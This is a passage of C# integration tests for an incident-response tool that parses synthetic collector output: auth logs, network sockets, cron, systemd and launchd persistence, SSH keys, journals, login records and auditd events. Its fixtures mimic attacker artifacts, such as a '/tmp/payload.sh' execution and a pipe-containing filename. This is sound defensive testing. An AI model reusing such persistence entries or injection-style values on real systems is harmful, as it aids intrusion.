                    "0|/Users/alice/.ssh/authorized_keys|128|rwxr-xr-x|501|20|512|1717200000|1717203600|1717207200|1717196400\r\n" +
                    "0|/var/log/system.log|256|rw-r--r--|0|0|4096|0|1717210000|1717213600|0\r\n",
                    new UTF8Encoding(false));

                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
                if (c == null) return false;

                string timelineCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.ActivityTimelineCsv);
                if (!File.Exists(timelineCsv)) return false;

                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
                if (store == null || store.Facts == null || store.Facts.Count < 4) return false;

                Fact created = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, "Bodyfile", StringComparison.Ordinal) &&
                    string.Equals(f.Action, "Created", StringComparison.Ordinal) &&
                    HasEntity(f, "Path", "/Users/alice/.ssh/authorized_keys"));
                if (created == null) return false;
                if (!string.Equals(created.TimeKind, FactTimeMetadata.MetadataTimeKind, StringComparison.Ordinal)) return false;
                if (!string.Equals(created.TimeConfidence, FactTimeMetadata.MediumConfidence, StringComparison.Ordinal)) return false;
                if ((created.Details ?? "").IndexOf("inode=128", StringComparison.OrdinalIgnoreCase) < 0) return false;
                if ((created.Details ?? "").IndexOf("uid=501", StringComparison.OrdinalIgnoreCase) < 0) return false;

                Fact metadataChanged = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, "Bodyfile", StringComparison.Ordinal) &&
                    string.Equals(f.Action, "MetadataChanged", StringComparison.Ordinal) &&
                    HasEntity(f, "Path", "/var/log/system.log"));
                if (metadataChanged == null) return false;
                if (metadataChanged.Time.Year != 2024) return false;

                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_auth_log_derives_structured_auth_facts()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_auth_" + Guid.NewGuid().ToString("N"));
            try
            {
                string authDir = Path.Combine(dir, "[root]", "var", "log");
                Directory.CreateDirectory(authDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-26 15:30:00 +0000 INF Operating system: linux\r\n" +
                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-AUTH-01\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(authDir, "auth.log"),
                    "Jul 26 15:20:01 uac-host sshd[111]: Failed password for invalid user backup from 203.0.113.50 port 51123 ssh2\r\n" +
                    "Jul 26 15:21:22 uac-host sudo[222]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id\r\n" +
                    "Jul 26 15:22:33 uac-host sshd[333]: Accepted publickey for bob from vpn.example.com port 61234 ssh2\r\n",
                    new UTF8Encoding(false));

                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
                if (c == null) return false;
                if (!string.Equals(c.Hostname, "UAC-AUTH-01", StringComparison.Ordinal)) return false;

                string authCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.UacAuthEventsCsv);
                if (!File.Exists(authCsv)) return false;

                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
                if (store == null || store.Facts == null || store.Facts.Count < 3) return false;

                Fact failed = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, UacAuthEventNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, "SshLoginFailed", StringComparison.Ordinal) &&
                    HasEntity(f, "TargetUser", "backup"));
                if (failed == null) return false;
                if (!HasEntity(failed, "RemoteIP", "203.0.113.50")) return false;
                if (failed.Time.Year != 2026 || failed.Time.Month != 7 || failed.Time.Day != 26) return false;

                Fact sudo = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, UacAuthEventNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, "SudoCommand", StringComparison.Ordinal) &&
                    HasEntity(f, "User", "alice"));
                if (sudo == null) return false;
                if (!HasEntity(sudo, "TargetUser", "root")) return false;
                if (!HasEntity(sudo, "Terminal", "pts/0")) return false;
                if (!HasEntity(sudo, "CommandLine", "/usr/bin/id")) return false;

                Fact accepted = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, UacAuthEventNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, "SshLoginAccepted", StringComparison.Ordinal) &&
                    HasEntity(f, "TargetUser", "bob"));
                if (accepted == null) return false;
                if (!HasEntity(accepted, "RemoteName", "vpn.example.com")) return false;

                return c.Artifacts != null &&
                    c.Artifacts.Keys.Any(k => string.Equals(Path.GetFileName(k), IR_Collect.ArtifactNames.UacAuthEventsCsv, StringComparison.OrdinalIgnoreCase));
            }
            catch
            {
                return false;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_network_snapshot_derives_network_connection_facts()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_net_" + Guid.NewGuid().ToString("N"));
            try
            {
                string networkDir = Path.Combine(dir, "live_response", "network");
                Directory.CreateDirectory(networkDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-26 15:30:00 +0000 INF Operating system: linux\r\n" +
                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-NET-01\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(networkDir, "ss_-tulpen.txt"),
                    "2026-07-26 15:30:00\r\n" +
                    "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\r\n" +
                    "tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=123,fd=3))\r\n" +
                    "tcp ESTAB 0 0 10.0.0.5:22 203.0.113.50:54444 users:((\"sshd\",pid=123,fd=4))\r\n" +
                    "udp UNCONN 0 0 [::1]:323 *:* users:((\"chronyd\",pid=77,fd=5))\r\n",
                    new UTF8Encoding(false));

                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
                if (c == null) return false;
                if (!string.Equals(c.Hostname, "UAC-NET-01", StringComparison.Ordinal)) return false;

                string networkCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.UacNetworkConnectionsCsv);
                if (!File.Exists(networkCsv)) return false;

                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
                if (store == null || store.Facts == null || store.Facts.Count < 3) return false;

                Fact listener = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, UacNetworkConnectionNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, "ListenerObserved", StringComparison.Ordinal) &&
                    HasEntity(f, "ProcessId", "123"));
                if (listener == null) return false;
                if (!HasEntity(listener, "ProcessName", "sshd")) return false;
                if (!HasEntity(listener, "LocalPort", "22")) return false;
                if (!string.Equals(listener.TimeKind, FactTimeMetadata.ObservedTimeKind, StringComparison.Ordinal)) return false;

                Fact connection = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, UacNetworkConnectionNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, "ConnectionObserved", StringComparison.Ordinal) &&
                    HasEntity(f, "RemoteIP", "203.0.113.50"));
                if (connection == null) return false;
                if (!HasEntity(connection, "ProcessName", "sshd")) return false;
                if (!HasEntity(connection, "RemotePort", "54444")) return false;
                if (connection.Time.Year != 2026 || connection.Time.Month != 7 || connection.Time.Day != 26) return false;

                Fact udp = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, UacNetworkConnectionNormalizer.SourceName, StringComparison.Ordinal) &&
                    HasEntity(f, "ProcessName", "chronyd"));
                if (udp == null) return false;

                return c.Artifacts != null &&
                    c.Artifacts.Keys.Any(k => string.Equals(Path.GetFileName(k), IR_Collect.ArtifactNames.UacNetworkConnectionsCsv, StringComparison.OrdinalIgnoreCase));
            }
            catch
            {
                return false;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_persistence_derives_linux_macos_facts()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_persist_" + Guid.NewGuid().ToString("N"));
            try
            {
                string root = Path.Combine(dir, "[root]");
                string cronDir = Path.Combine(root, "etc", "cron.d");
                string systemdDir = Path.Combine(root, "etc", "systemd", "system");
                string sshDir = Path.Combine(root, "home", "alice", ".ssh");
                string launchDaemonDir = Path.Combine(root, "Library", "LaunchDaemons");
                string launchAgentDir = Path.Combine(root, "Library", "LaunchAgents");
                Directory.CreateDirectory(cronDir);
                Directory.CreateDirectory(systemdDir);
                Directory.CreateDirectory(sshDir);
                Directory.CreateDirectory(launchDaemonDir);
                Directory.CreateDirectory(launchAgentDir);

                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-27 01:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-27 01:00:00 +0000 INF Operating system: linux\r\n" +
                    "2026-07-27 01:00:00 +0000 INF Hostname: UAC-PERSIST-01\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(cronDir, "update-agent"),
                    "*/5 * * * * root /usr/local/bin/update-agent --quiet\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(systemdDir, "update-agent.service"),
                    "[Unit]\r\nDescription=Update Agent\r\n" +
                    "[Service]\r\nUser=svc-update\r\nExecStart=/opt/update-agent/bin/agent --poll\r\n" +
                    "[Install]\r\nWantedBy=multi-user.target\r\n",
                    new UTF8Encoding(false));

                string publicKeyMaterial = Convert.ToBase64String(Encoding.ASCII.GetBytes("synthetic-public-key-blob"));
                File.WriteAllText(Path.Combine(sshDir, "authorized_keys"),
                    "command=\"echo ssh-rsa not-a-key\",restrict ssh-ed25519 " + publicKeyMaterial + " alice@test\r\n",
                    new UTF8Encoding(false));

                File.WriteAllText(Path.Combine(launchDaemonDir, "com.example.sync.plist"),
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\r\n" +
                    "<plist version=\"1.0\"><dict>" +
                    "<key>Label</key><string>com.example.sync</string>" +
                    "<key>ProgramArguments</key><array><string>/Library/Example/sync</string><string>--daemon</string></array>" +
                    "<key>RunAtLoad</key><true/>" +
                    "<key>UserName</key><string>root</string>" +
                    "</dict></plist>",
                    new UTF8Encoding(false));
                File.WriteAllBytes(Path.Combine(launchAgentDir, "com.example.binary.plist"),
                    Convert.FromBase64String(
                        "YnBsaXN0MDDXAQIDBAUGBwgJCg0ODxBYRGlzYWJsZWRVTGFiZWxfEBBQcm9ncmFtQXJndW1lbnRzWVJ1bkF0TG9hZF1TdGFydEludGVydmFsWFVzZXJOYW1lXxAQV29ya2luZ0RpcmVjdG9yeQhfEBJjb20uZXhhbXBsZS5iaW5hcnmiCwxfEBwvTGlicmFyeS9FeGFtcGxlL2JpbmFyeS1zeW5jWC0tZGFlbW9uCREBLFRyb290XxAQL0xpYnJhcnkvRXhhbXBsZQgXICY5Q1FabW6DhqWur7K3AAAAAAAAAQEAAAAAAAAAEQAAAAAAAAAAAAAAAAAAAMo="));
                File.WriteAllBytes(Path.Combine(launchAgentDir, "com.example.corrupt.plist"),
                    Encoding.ASCII.GetBytes("bplist00synthetic"));

                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
                    throw new InvalidOperationException("UAC evidence was not detected.");
                string persistenceCsv = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPersistenceCsv);
                if (!File.Exists(persistenceCsv))
                    throw new InvalidOperationException("Canonical persistence CSV was not created.");
                string csv = File.ReadAllText(persistenceCsv);
                if (csv.IndexOf("cron", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("systemd-service", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("ssh-authorized-key", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("launchd-daemon", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("One or more persistence mechanisms were not derived: " + csv);
                if (csv.IndexOf(publicKeyMaterial, StringComparison.Ordinal) >= 0)
                    throw new InvalidOperationException("Full SSH public key material leaked into canonical persistence CSV.");

                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                string binaryPlistRow = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("com.example.binary.plist", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(binaryPlistRow) ||
                    binaryPlistRow.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Valid binary plist was not normalized: " + (binaryPlistRow ?? "(missing)"));
                string corruptPlistRow = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("com.example.corrupt.plist", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(corruptPlistRow) ||
                    corruptPlistRow.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Corrupt binary plist was not retained as indexed-raw: " + (corruptPlistRow ?? "(missing)"));

                FactStore store = FactStore.BuildFromCase(c);
                if (store == null || store.Facts == null)
                    throw new InvalidOperationException("Fact Store was not built.");
                Fact cron = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
                    HasEntity(x, "TaskName", "update-agent") &&
                    HasEntity(x, "User", "root"));
                if (cron == null || !HasEntity(cron, "CommandLine", "/usr/local/bin/update-agent --quiet"))
                    throw new InvalidOperationException("Cron fact or command entity missing.");

                Fact systemd = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
                    HasEntity(x, "ServiceName", "update-agent.service"));
                if (systemd == null || !HasEntity(systemd, "Path", "/opt/update-agent/bin/agent"))
                    throw new InvalidOperationException("systemd fact or executable path missing.");
                if (!string.Equals(systemd.CollectionStep, "Persistence", StringComparison.Ordinal))
                    throw new InvalidOperationException("systemd fact provenance step missing.");
                if (!string.Equals(systemd.Action, "PersistenceConfigurationObserved", StringComparison.Ordinal))
                    throw new InvalidOperationException("systemd fact action mismatch.");

                Fact ssh = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
                    HasEntity(x, "User", "alice") &&
                    x.EntityRefs.Any(e => e.Type == "Hash" && e.Value.StartsWith("SHA256:", StringComparison.Ordinal)));
                if (ssh == null)
                    throw new InvalidOperationException("SSH authorized-key fingerprint fact missing.");

                Fact launchd = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
                    HasEntity(x, "ServiceName", "com.example.sync"));
                if (launchd == null || !HasEntity(launchd, "Path", "/Library/Example/sync"))
                    throw new InvalidOperationException("launchd fact or program path missing.");
                if (launchd.ParserNote.IndexOf("does not by itself prove execution", StringComparison.OrdinalIgnoreCase) < 0)
                    throw new InvalidOperationException("Facts-only parser note missing.");
                Fact binaryLaunchd = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
                    HasEntity(x, "ServiceName", "com.example.binary"));
                if (binaryLaunchd == null || !HasEntity(binaryLaunchd, "Path", "/Library/Example/binary-sync") ||
                    !HasEntity(binaryLaunchd, "CommandLine", "/Library/Example/binary-sync --daemon"))
                    throw new InvalidOperationException("Binary launchd plist fact was not normalized.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("UAC persistence integration test failed: " + (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_journal_derives_header_and_boot_facts()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_journal_" + Guid.NewGuid().ToString("N"));
            try
            {
                string journalDir = Path.Combine(dir, "[root]", "var", "log", "journal",
                    "202122232425262728292a2b2c2d2e2f");
                string liveSystemDir = Path.Combine(dir, "live_response", "system");
                Directory.CreateDirectory(journalDir);
                Directory.CreateDirectory(liveSystemDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-27 01:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-27 01:00:00 +0000 INF Operating system: linux\r\n" +
                    "2026-07-27 01:00:00 +0000 INF Hostname: UAC-JOURNAL-01\r\n",
                    new UTF8Encoding(false));

                var header = new byte[272];
                Encoding.ASCII.GetBytes("LPKSHHRH").CopyTo(header, 0);
                BitConverter.GetBytes((uint)2).CopyTo(header, 8);
                BitConverter.GetBytes((uint)(8 | 16)).CopyTo(header, 12);
                header[16] = 2;
                for (int i = 0; i < 16; i++)
                {
                    header[24 + i] = (byte)(0x10 + i);
                    header[40 + i] = (byte)(0x20 + i);
                    header[56 + i] = (byte)(0x40 + i);
                    header[72 + i] = (byte)(0x60 + i);
                }
                BitConverter.GetBytes((ulong)272).CopyTo(header, 88);
                BitConverter.GetBytes((ulong)0).CopyTo(header, 96);
                BitConverter.GetBytes((ulong)25).CopyTo(header, 144);
                BitConverter.GetBytes((ulong)5).CopyTo(header, 152);
                BitConverter.GetBytes((ulong)105).CopyTo(header, 160);
                BitConverter.GetBytes((ulong)101).CopyTo(header, 168);
                DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                DateTime first = new DateTime(2026, 7, 27, 0, 0, 0, DateTimeKind.Utc);
                DateTime last = new DateTime(2026, 7, 27, 1, 0, 0, DateTimeKind.Utc);
                BitConverter.GetBytes((ulong)((first - epoch).Ticks / 10)).CopyTo(header, 184);
                BitConverter.GetBytes((ulong)((last - epoch).Ticks / 10)).CopyTo(header, 192);
                File.WriteAllBytes(Path.Combine(journalDir, "system.journal"), header);
                File.WriteAllBytes(Path.Combine(journalDir, "corrupt.journal~"),
                    Encoding.ASCII.GetBytes("LPKSHHRH"));

                string bootId = new string('a', 32);
                File.WriteAllText(Path.Combine(liveSystemDir, "journalctl_--list-boots.txt"),
                    "-1 " + bootId + " Mon 2026-07-27 00:00:00 UTC\u2014Mon 2026-07-27 01:00:00 UTC\r\n",
                    new UTF8Encoding(false));

                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
                    throw new InvalidOperationException("UAC journal evidence was not detected.");
                string journalCsvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacJournalFilesCsv);
                string bootCsvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacBootSessionsCsv);
                if (!File.Exists(journalCsvPath) || !File.Exists(bootCsvPath))
                    throw new InvalidOperationException("Journal canonical CSVs were not created.");
                string journalCsv = File.ReadAllText(journalCsvPath);
                if (journalCsv.IndexOf("\"archived\"", StringComparison.Ordinal) < 0 ||
                    journalCsv.IndexOf("compressed-zstd|compact", StringComparison.Ordinal) < 0 ||
                    journalCsv.IndexOf(",25,5,101,105,", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Journal header fields were not derived: " + journalCsv +
                        "; warnings=" + string.Join(" | ", c.LoadWarnings.ToArray()));
                string bootCsv = File.ReadAllText(bootCsvPath);
                if (bootCsv.IndexOf(bootId, StringComparison.Ordinal) < 0 ||
                    bootCsv.IndexOf("2026-07-27T00:00:00.0000000Z", StringComparison.Ordinal) < 0 ||
                    bootCsv.IndexOf("\"utc-parsed\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Boot session fields were not derived: " + bootCsv);

                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                string validJournal = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("system.journal", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(validJournal) ||
                    validJournal.IndexOf("\"metadata-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Valid journal was not marked metadata-source.");
                string corruptJournal = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("corrupt.journal~", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(corruptJournal) ||
                    corruptJournal.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Corrupt journal was not retained as indexed-raw.");
                string bootSource = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("journalctl_--list-boots.txt", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(bootSource) ||
                    bootSource.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Boot-list source was not marked normalized-source.");

                FactStore store = FactStore.BuildFromCase(c);
                Fact journalFact = store.Facts.FirstOrDefault(x =>
                    x.Source == UacJournalFileNormalizer.SourceName &&
                    HasEntity(x, "MachineId", "202122232425262728292a2b2c2d2e2f"));
                if (journalFact == null || !HasEntity(journalFact, "BootId", "404142434445464748494a4b4c4d4e4f"))
                    throw new InvalidOperationException("Journal header fact entities missing.");
                if (journalFact.ParserNote.IndexOf("individual journal entries remain raw", StringComparison.OrdinalIgnoreCase) < 0)
                    throw new InvalidOperationException("Journal scope parser note missing.");
                Fact bootFact = store.Facts.FirstOrDefault(x =>
                    x.Source == UacBootSessionNormalizer.SourceName && HasEntity(x, "BootId", bootId));
                if (bootFact == null || bootFact.Time.Year != 2026 ||
                    !string.Equals(bootFact.Action, "BootSessionObserved", StringComparison.Ordinal))
                    throw new InvalidOperationException("Boot-session fact missing.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("UAC journal integration test failed: " + (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_login_outputs_derive_facts_without_inventing_utc()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_login_" + Guid.NewGuid().ToString("N"));
            try
            {
                string liveSystemDir = Path.Combine(dir, "live_response", "system");
                Directory.CreateDirectory(liveSystemDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-27 19:30:00 +0000 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-27 19:30:00 +0000 INF Operating system: linux\r\n" +
                    "2026-07-27 19:30:00 +0000 INF Hostname: UAC-LOGIN-01\r\n",
                    new UTF8Encoding(false));

                File.WriteAllText(Path.Combine(liveSystemDir, "last_-a_-F.txt"),
                    "alice pts/0 Mon Jul 27 17:10:11 2026 - Mon Jul 27 18:11:12 2026 (01:01) 203.0.113.8\r\n" +
                    "reboot system boot 6.8.0-test Mon Jul 27 16:00:00 2026 - Mon Jul 27 19:00:00 2026 (03:00)\r\n" +
                    "wtmp begins Mon Jul 27 16:00:00 2026\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(liveSystemDir, "lastb_-a_-F.txt"),
                    "root ssh:notty Mon Jul 27 17:05:00 2026 - Mon Jul 27 17:05:01 2026 (00:00) 198.51.100.20\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(liveSystemDir, "lastlog.txt"),
                    "Username         Port     From             Latest\r\n" +
                    "alice            pts/0    203.0.113.8      Mon Jul 27 09:10:11 +0000 2026\r\n" +
                    "nobody                                     **Never logged in**\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(liveSystemDir, "utmpdump_[root]var_log_wtmp.txt"),
                    "[7] [01234] [ts/0] [alice] [pts/0] [vpn.example] [203.0.113.8] [2026-07-27T09:10:11,123456+00:00]\r\n" +
                    "[8] [01234] [ts/0] [] [pts/0] [] [0.0.0.0] [2026-07-27T10:11:12,654321+00:00]\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(liveSystemDir, "utmpdump_corrupt.txt"),
                    "[7] [not-a-complete-record]\r\n",
                    new UTF8Encoding(false));

                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
                    throw new InvalidOperationException("UAC login evidence was not detected.");

                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacLoginEventsCsv);
                if (!File.Exists(csvPath))
                    throw new InvalidOperationException("UAC login canonical CSV was not created.");
                string csv = File.ReadAllText(csvPath);
                if (csv.IndexOf("LoginSessionObserved", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("LoginFailureObserved", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("LoginSessionStarted", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("LoginSessionEnded", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("2026-07-27T09:10:11.1234560Z", StringComparison.Ordinal) < 0 ||
                    csv.IndexOf("local-time-no-offset", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Login records were not derived as expected: " + csv);

                List<Dictionary<string, string>> rows = CorrelationCsvHelper.ReadCsv(csvPath);
                Dictionary<string, string> localLast = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "SourceType"), "last", StringComparison.Ordinal) &&
                    string.Equals(CorrelationCsvHelper.Get(x, "User"), "alice", StringComparison.Ordinal));
                if (localLast == null ||
                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(localLast, "TimeUtc")) ||
                    !string.Equals(CorrelationCsvHelper.Get(localLast, "TimeParseStatus"),
                        "local-time-no-offset", StringComparison.Ordinal))
                    throw new InvalidOperationException("Local last timestamp was incorrectly promoted to UTC.");

                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" },
                    StringSplitOptions.RemoveEmptyEntries);
                string validUtmp = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("utmpdump_[root]var_log_wtmp.txt", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(validUtmp) ||
                    validUtmp.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Valid utmpdump source was not marked normalized-source.");
                string corruptUtmp = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("utmpdump_corrupt.txt", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(corruptUtmp) ||
                    corruptUtmp.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Corrupt utmpdump source was not retained as indexed-raw.");

                FactStore store = FactStore.BuildFromCase(c);
                Fact started = store.Facts.FirstOrDefault(x =>
                    x.Source == UacLoginEventNormalizer.SourceName &&
                    string.Equals(x.Action, "LoginSessionStarted", StringComparison.Ordinal) &&
                    HasEntity(x, "User", "alice") &&
                    HasEntity(x, "RemoteIP", "203.0.113.8"));
                if (started == null || started.Time.Year != 2026 ||
                    !HasEntity(started, "SessionRecordId", "ts/0"))
                    throw new InvalidOperationException("Offset-backed login fact was not normalized.");

                Fact local = store.Facts.FirstOrDefault(x =>
                    x.Source == UacLoginEventNormalizer.SourceName &&
                    string.Equals(x.Action, "LoginSessionObserved", StringComparison.Ordinal) &&
                    HasEntity(x, "User", "alice"));
                if (local == null || local.Time != DateTime.MinValue || !local.FallbackUsed ||
                    local.ParserNote.IndexOf("no UTC value was invented", StringComparison.OrdinalIgnoreCase) < 0)
                    throw new InvalidOperationException("Local-time provenance guard was not preserved.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("UAC login integration test failed: " + (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_auditd_groups_compound_events_and_decodes_commands()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_audit_" + Guid.NewGuid().ToString("N"));
            try
            {
                string auditDir = Path.Combine(dir, "[root]", "var", "log", "audit");
                Directory.CreateDirectory(auditDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-28 00:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-28 00:00:00 +0000 INF Operating system: linux\r\n" +
                    "2026-07-28 00:00:00 +0000 INF Hostname: UAC-AUDIT-01\r\n",
                    new UTF8Encoding(false));

                File.WriteAllText(Path.Combine(auditDir, "audit.log"),
                    "type=SYSCALL msg=audit(1700000000.123:42): arch=c000003e syscall=59 success=yes exit=0 items=1 ppid=900 pid=901 auid=1000 uid=1000 euid=0 tty=pts0 ses=7 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"exec-monitor\"\r\n" +
                    "type=USER_LOGIN msg=audit(1700000001.456:43): pid=111 uid=0 auid=1000 ses=8 msg='op=login acct=\"alice\" exe=\"/usr/sbin/sshd\" hostname=client.example addr=198.51.100.7 terminal=/dev/pts/1 res=success'\r\n" +
                    "type=EXECVE msg=audit(1700000000.123:42): argc=3 a0=2F62696E2F7368 a1=\"-c\" a2=6964\r\n" +
                    "type=CWD msg=audit(1700000000.123:42): cwd=\"/tmp\"\r\n" +
                    "type=PATH msg=audit(1700000000.123:42): item=0 name=\"/tmp/payload.sh\" inode=123 dev=08:01 mode=0100755\r\n" +
                    "type=PATH msg=audit(1700000000.123:42): item=1 name=\"/tmp/pay|load.sh\" inode=124 dev=08:01 mode=0100755\r\n" +
                    "type=EOE msg=audit(1700000000.123:42):\r\n" +
